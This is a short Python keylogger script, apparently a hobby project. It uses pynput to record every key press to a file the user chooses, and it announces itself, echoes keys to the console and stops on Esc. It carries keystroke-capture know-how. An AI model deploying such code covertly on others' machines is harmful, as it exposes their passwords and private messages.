#Click on the 3 points next to the file name to see the description


from pynput import keyboard

def key_logger() :

    save = True    # A flag to control whether key presses should be saved or not

    def on_press(key):      # This function is called when a key is pressed
        global log_file_path

        if hasattr(key, 'char') and save == True:  # Check if the key has the 'char' attribute (i.e., it's a character key) and saving is enabled
            print(f"Alphanumeric key pressed: {key.char}")
            with open(log_file_path, "a") as log_file:       # Open the log file in append mode
                log_file.write(f"{key.char}")      # Write the character key to the file

        elif (not hasattr(key, 'char')) and save == True : 
            print(f"Special key pressed: {key}")
            with open(log_file_path, "a") as log_file:
                log_file.write(f" {key} ")

    def on_release(key):          # This function is called when a key is released
        nonlocal save

        if key == keyboard.Key.esc:              # If the Esc key is pressed
            print("Listening finished")
            return False             # Stop the listener

        elif key == keyboard.Key.tab :            # If the tab key is pressed

            if save == True:
                save = False         # Disable saving
                print('Saving stopped, if you want to continue, press "Tab"')
            else:
                save = True          # Enable saving if it's already disabled
                print('Saving restarted')

    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()                     # Keep the listener running until it is stopped

if __name__ == "__main__" : 
    print('''
    SAAD's KEY LOGGER is listening your keyboard...
    If you want to stop listening, press "ESC"
    If you want to stop saving to file, press "Tab"
    ''')
    log_file_path = input("Please enter the path where you want to save the logged keys. Please use '/' instead of '\\' in the path :\n")
    print("Listening started")
    key_logger()
